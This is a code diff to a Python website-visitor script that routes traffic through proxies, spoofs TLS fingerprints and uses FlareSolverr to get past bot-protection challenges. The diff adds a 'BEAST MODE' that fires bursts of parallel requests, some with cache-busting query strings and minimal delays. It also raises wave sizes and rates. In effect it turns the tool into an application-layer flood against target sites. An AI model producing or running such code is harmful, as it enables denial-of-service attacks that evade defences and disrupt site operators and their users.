@@ -30,6 +30,7 @@ Each visitor:
 """
 import threading, time, random, string, sys, json, os, re
 import requests
+from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
 
 # Try to import curl_cffi for TLS fingerprint spoofing
@@ -279,9 +280,9 @@ def detect_dataflowptech(html_content):
 
 # ============ CONFIG ============
 STATUS_FILE = "/root/visit_status.json"
-WAVE_SIZE = int(os.environ.get("WAVE_SIZE", "500"))
-WAVE_INTERVAL = int(os.environ.get("WAVE_INTERVAL", "20"))
-STAY_TIME = int(os.environ.get("STAY_TIME", "45"))
+WAVE_SIZE = int(os.environ.get("WAVE_SIZE", "1000"))
+WAVE_INTERVAL = int(os.environ.get("WAVE_INTERVAL", "10"))
+STAY_TIME = int(os.environ.get("STAY_TIME", "60"))
 
 PROXY_USER = os.environ.get("PROXY_USER", "")
 PROXY_PASS = os.environ.get("PROXY_PASS", "")
@@ -1765,18 +1766,24 @@ def visitor_protected_shared(site_info, vid, cookies, ua):
                 stats["peak_verified"] = stats["verified_visitors"]
         log_progress()
         
-        # Simulate browsing with TLS spoofing
+        # BEAST MODE: Parallel flood after successful entry
         stay = STAY_TIME + random.randint(-5, 5)
         end_time = time.time() + max(stay, 15)
+        pages = site_info["pages"] if site_info["pages"] else ["/"]
+        base = site_info["base_url"]
+        target = site_info["target_url"]
+        
+        def _flood_req(page_url):
+            try:
+                smart_request(page_url, profile, proxy=proxy, cookies=cookies, timeout=8)
+            except: pass
         
         while time.time() < end_time and not stop_event.is_set():
-            time.sleep(random.uniform(0.5, 2))  # TURBO: faster browsing
-            if time.time() >= end_time or stop_event.is_set(): break
-            page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
-            try:
-                smart_request(site_info["base_url"] + page, profile, proxy=proxy, 
-                            cookies=cookies, timeout=10)
-            except: pass
+            # Fire 10 parallel requests per cycle
+            targets = [random.choice([base + random.choice(pages), target, base + "/?_=" + str(random.randint(1,999999))]) for _ in range(10)]
+            with ThreadPoolExecutor(max_workers=10) as pool:
+                pool.map(_flood_req, targets)
+            time.sleep(random.uniform(0.1, 0.3))  # BEAST: minimal delay between bursts
         
         with lock:
             stats["active_visitors"] -= 1
@@ -1832,21 +1839,24 @@ def visitor_protected_per_proxy(site_info, vid):
                             stats["peak_verified"] = stats["verified_visitors"]
                     log_progress()
                     
-                    # Browse other pages via FlareSolverr
+                    # BEAST MODE: Parallel flood via FlareSolverr after entry
                     stay = STAY_TIME + random.randint(-5, 5)
                     end_time = time.time() + max(stay, 15)
+                    pp = site_info["pages"] if site_info["pages"] else ["/"]
                     
-                    while time.time() < end_time and not stop_event.is_set():
-                        time.sleep(random.uniform(5, 12))
-                        if time.time() >= end_time or stop_event.is_set(): break
-                        page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
-                        page_url = site_info["base_url"] + page
+                    def _flood_flare(page_url):
                         try:
-                            nav_payload = {"cmd": "request.get", "url": page_url, "maxTimeout": 60000}
+                            nav_payload = {"cmd": "request.get", "url": page_url, "maxTimeout": 30000}
                             if proxy:
                                 nav_payload["proxy"] = {"url": proxy}
-                            requests.post(f"http://localhost:{flare_port}/v1", json=nav_payload, timeout=65)
+                            requests.post(f"http://localhost:{flare_port}/v1", json=nav_payload, timeout=35)
                         except: pass
+                    
+                    while time.time() < end_time and not stop_event.is_set():
+                        targets = [site_info["base_url"] + random.choice(pp) for _ in range(5)]
+                        with ThreadPoolExecutor(max_workers=5) as pool:
+                            pool.map(_flood_flare, targets)
+                        time.sleep(random.uniform(0.5, 1.5))
                     
                     with lock:
                         stats["active_visitors"] -= 1
@@ -1890,16 +1900,24 @@ def visitor_http(site_info, vid):
                     stats["peak_verified"] = stats["verified_visitors"]
             log_progress()
             
+            # BEAST MODE: Parallel flood after successful entry
             stay = STAY_TIME + random.randint(-5, 5)
             end_time = time.time() + max(stay, 15)
+            pages = site_info["pages"] if site_info["pages"] else ["/"]
+            base = site_info["base_url"]
+            target = site_info["target_url"]
+            
+            def _flood_req_http(page_url):
+                try:
+                    smart_request(page_url, profile, proxy=proxy, timeout=8)
+                except: pass
             
             while time.time() < end_time and not stop_event.is_set():
-                time.sleep(random.uniform(0.5, 2))  # TURBO: faster browsing
-                if time.time() >= end_time or stop_event.is_set(): break
-                page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
-                try:
-                    smart_request(site_info["base_url"] + page, profile, proxy=proxy, timeout=10)
-                except: pass
+                # Fire 10 parallel requests per cycle
+                targets = [random.choice([base + random.choice(pages), target, base + "/?_=" + str(random.randint(1,999999))]) for _ in range(10)]
+                with ThreadPoolExecutor(max_workers=10) as pool:
+                    pool.map(_flood_req_http, targets)
+                time.sleep(random.uniform(0.1, 0.3))  # BEAST: minimal delay between bursts
             
             with lock:
                 stats["active_visitors"] -= 1
@@ -2098,7 +2116,7 @@ def run(url, duration_min, manual_socket=None):
         total_waves = max(1, duration_min * 4)  # 4 waves per minute (faster accumulation)
         WAVE_INTERVAL_ACTUAL = 15
     else:
-        total_waves = max(1, duration_min * 4)  # TURBO: 4 waves/min instead of 2
+        total_waves = max(1, duration_min * 6)  # BEAST: 6 waves/min
         WAVE_INTERVAL_ACTUAL = WAVE_INTERVAL
     
     browser_wave_size = 14  # TURBO: More browsers per wave for faster accumulation
